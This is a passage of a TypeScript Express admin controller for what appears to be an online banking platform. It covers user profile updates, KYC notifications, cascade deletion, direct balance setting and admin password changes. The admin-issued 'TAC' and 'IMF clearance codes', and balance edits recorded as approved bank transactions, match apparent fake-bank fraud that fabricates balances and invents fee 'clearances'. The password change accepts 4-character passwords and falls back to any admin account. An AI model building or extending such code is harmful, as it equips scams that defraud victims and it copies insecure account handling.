    const accounts = await UserAccount.find({ username: user.username });
    res.json({ user, accounts });
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching user details', error: error.message });
  }
};

// Update User details
export const updateUserDetails = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const {
      fullName,
      email,
      phoneNumber,
      country,
      state,
      city,
      address,
      zipCode,
      gender,
      occupation,
      dob,
      idType,
      pin,
      suspended,
      isVerified,
      onReview,
      swiftCode,
      routine,
      iban,
      tacCode,
      imf,
    } = req.body;

    const user = await User.findById(req.params.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    if (fullName !== undefined) user.fullName = fullName;
    if (email !== undefined) user.email = email;
    if (phoneNumber !== undefined) user.phoneNumber = phoneNumber;
    if (country !== undefined) user.country = country;
    if (state !== undefined) user.state = state;
    if (city !== undefined) user.city = city;
    if (address !== undefined) user.address = address;
    if (zipCode !== undefined) user.zipCode = zipCode;
    if (gender !== undefined) user.gender = gender;
    if (occupation !== undefined) user.occupation = occupation;
    if (idType !== undefined) user.idType = idType;
    if (dob !== undefined) {
      if (typeof dob === 'number') {
        user.dob = dob;
      } else if (typeof dob === 'string' && dob.trim() !== '') {
        const parsed = new Date(dob).getTime();
        user.dob = isNaN(parsed) ? (parseInt(dob) || 0) : parsed;
      }
    }
    if (pin !== undefined) user.pin = parseInt(pin) || 0;
    if (suspended !== undefined) user.suspended = suspended;
    if (isVerified !== undefined) {
      const wasVerified = user.isVerified;
      user.isVerified = isVerified;
      if (onReview !== undefined) {
        user.onReview = onReview;
      } else {
        user.onReview = false;
      }

      if (isVerified) {
        let appTitle = 'Identity Clearance Approved';
        let appContent = 'We write to notify you that your identity verification profile (KYC) has been reviewed and approved. Your account is now fully cleared and verified. You may now apply for credit cards.';

        try {
          const appTemp = await NotificationTemplate.findOne({
            $or: [{ name: 'KYC-Approved' }, { name: 'kyc_approved' }]
          });
          if (appTemp) {
            appTitle = appTemp.title.replace(/\{\{fullName\}\}/g, user.fullName || user.username).replace(/\{\{username\}\}/g, user.username);
            appContent = appTemp.content.replace(/\{\{fullName\}\}/g, user.fullName || user.username).replace(/\{\{username\}\}/g, user.username);
          }
        } catch (e) {
          console.error('Error finding KYC-Approved template:', e);
        }

        const kycNotif = new Notification({
          username: user.username,
          title: appTitle,
          content: appContent,
          time: Math.floor(Date.now() / 1000),
          isRead: false,
          admin: false,
        });
        await kycNotif.save();

        sendToUser(user.username, {
          type: 'KYC_APPROVED',
          title: appTitle,
          content: appContent,
          notification: kycNotif,
        });
      } else if (!isVerified && (onReview === false || !user.onReview)) {
        let rejTitle = 'Identity Verification Update';
        let rejContent = 'We write to notify you that your identity verification profile (KYC) submission could not be approved. Please review your profile information and re-upload valid identity documentation.';

        try {
          const rejTemp = await NotificationTemplate.findOne({
            $or: [{ name: 'KYC-Rejected' }, { name: 'kyc_rejected' }]
          });
          if (rejTemp) {
            rejTitle = rejTemp.title.replace(/\{\{fullName\}\}/g, user.fullName || user.username).replace(/\{\{username\}\}/g, user.username);
            rejContent = rejTemp.content.replace(/\{\{fullName\}\}/g, user.fullName || user.username).replace(/\{\{username\}\}/g, user.username);
          }
        } catch (e) {
          console.error('Error finding KYC-Rejected template:', e);
        }

        const rejNotif = new Notification({
          username: user.username,
          title: rejTitle,
          content: rejContent,
          time: Math.floor(Date.now() / 1000),
          isRead: false,
          admin: false,
        });
        await rejNotif.save();

        sendToUser(user.username, {
          type: 'KYC_REJECTED',
          title: rejTitle,
          content: rejContent,
          notification: rejNotif,
        });
      }
    } else if (onReview !== undefined) {
      user.onReview = onReview;
    }
    if (swiftCode !== undefined) user.swiftCode = swiftCode;
    if (routine !== undefined) user.routine = routine;
    if (iban !== undefined) user.iban = iban;
    if (tacCode !== undefined) {
      user.tacCode = tacCode;
      user.tacCodeRequest = false;

      if (tacCode) {
        let appTitle = 'TAC Clearance Code Approved';
        let appContent = `We write to notify you that your TAC clearance code request has been approved. Your TAC Code is: ${tacCode}.`;

        try {
          const appTemp = await NotificationTemplate.findOne({
            $or: [{ name: 'Tac-Request-Approved' }, { name: 'Tac-Approval' }, { name: 'Tax-Request-Approved' }]
          });
          if (appTemp) {
            appTitle = appTemp.title
              .replace(/\{\{tacCode\}\}/g, tacCode)
              .replace(/\{\{fullName\}\}/g, user.fullName)
              .replace(/\{\{username\}\}/g, user.username);

            appContent = appTemp.content
              .replace(/\{\{tacCode\}\}/g, tacCode)
              .replace(/\{\{fullName\}\}/g, user.fullName)
              .replace(/\{\{username\}\}/g, user.username);
          }
        } catch (e) {
          console.error('Error finding Tac-Request-Approved template:', e);
        }

        const appNotif = new Notification({
          username: user.username,
          title: appTitle,
          content: appContent,
          time: Math.floor(Date.now() / 1000),
          isRead: false,
          admin: false,
        });
        await appNotif.save();

        sendToUser(user.username, {
          type: 'TAC_APPROVED',
          title: appTitle,
          content: appContent,
          tacCode,
          notification: appNotif,
        });
      }
    }
    if (imf !== undefined) {
      user.imf = imf;
      user.imfRequest = false;

      if (imf) {
        let appTitle = 'IMF Clearance Code Approved';
        let appContent = `We write to notify you that your IMF clearance code request has been approved. Your IMF Code is: ${imf}.`;

        try {
          const appTemp = await NotificationTemplate.findOne({
            $or: [{ name: 'IMF-Request-Approved' }, { name: 'IMF-Approval' }, { name: 'IMF-Request' }]
          });
          if (appTemp) {
            appTitle = appTemp.title
              .replace(/\{\{imfCode\}\}/g, imf)
              .replace(/\{\{fullName\}\}/g, user.fullName)
              .replace(/\{\{username\}\}/g, user.username);

            appContent = appTemp.content
              .replace(/\{\{imfCode\}\}/g, imf)
              .replace(/\{\{fullName\}\}/g, user.fullName)
              .replace(/\{\{username\}\}/g, user.username);
          }
        } catch (e) {
          console.error('Error finding IMF-Request-Approved template:', e);
        }

        const appNotif = new Notification({
          username: user.username,
          title: appTitle,
          content: appContent,
          time: Math.floor(Date.now() / 1000),
          isRead: false,
          admin: false,
        });
        await appNotif.save();

        sendToUser(user.username, {
          type: 'IMF_APPROVED',
          title: appTitle,
          content: appContent,
          imfCode: imf,
          notification: appNotif,
        });
      }
    }

    await user.save();
    res.json({ message: 'User details updated successfully', user });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating user', error: error.message });
  }
};

// Delete User (Full Cascade Deletion of all user-related documents)
export const deleteUser = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    const username = user.username;

    // Cascade delete all documents associated with this user across all collections
    await Promise.all([
      UserAccount.deleteMany({ username }),
      Transaction.deleteMany({ $or: [{ username }, { receiverUsername: username }] }),
      Card.deleteMany({ username }),
      Notification.deleteMany({ username }),
      User.findByIdAndDelete(req.params.id),
    ]);

    res.json({ message: `User @${username} and all associated documents deleted successfully` });
  } catch (error: any) {
    res.status(500).json({ message: 'Error deleting user and related records', error: error.message });
  }
};

// Adjust User Balance
export const adjustUserBalance = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { currency, amount } = req.body;
    const user = await User.findById(req.params.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    const parsedAmount = parseFloat(amount);
    if (isNaN(parsedAmount)) {
       res.status(400).json({ message: 'Invalid balance amount' });
       return;
    }

    let account = await UserAccount.findOne({ username: user.username, currency });
    if (!account) {
      account = new UserAccount({
        username: user.username,
        currency,
        balance: 0,
        symbol: currency === 'EUR' ? '€' : currency === 'GBP' ? '£' : '$',
        accountNumber: user.accountNumber,
        name: user.fullName,
      });
    }

    const previousBalance = account.balance;
    account.balance = parsedAmount;
    await account.save();

    const diff = parsedAmount - previousBalance;
    if (diff !== 0) {
      const type = diff > 0 ? 'Credit' : 'Debit';
      const adjTx = new Transaction({
        username: user.username,
        amount: Math.abs(diff),
        transactionType: type,
        receiverName: user.fullName,
        receiverAccountNumber: user.accountNumber,
        receiverBank: 'Access National Bank',
        status: 'Approved',
        senderName: 'System Admin',
        currency,
        symbol: account.symbol,
        logo: account.logo,
        transactionState: `Admin adjustment entry`,
      });
      await adjTx.save();
    }

    res.json({ message: 'Account balance adjusted successfully', account });
  } catch (error: any) {
    res.status(500).json({ message: 'Error adjusting balance', error: error.message });
  }
};

// Change Admin Password
export const changeAdminPassword = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { password } = req.body;

    if (!password || password.length < 4) {
      res.status(400).json({ message: 'Password must be at least 4 characters.' });
      return;
    }

    let admin = null;
    if (req.user?.id) {
      admin = await User.findById(req.user.id);
    }
    if (!admin && req.user?.username) {
      admin = await User.findOne({ username: req.user.username });
    }
    if (!admin) {
      admin = await User.findOne({ status: { $regex: /^admin$/i } });
    }

    if (!admin) {
      res.status(404).json({ message: 'Admin user account not found.' });
      return;
    }

    const salt = await bcrypt.genSalt(10);
    admin.passwordHash = await bcrypt.hash(password, salt);
    await admin.save();

    res.json({ message: 'Password updated successfully.' });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating password', error: error.message });
  }
};

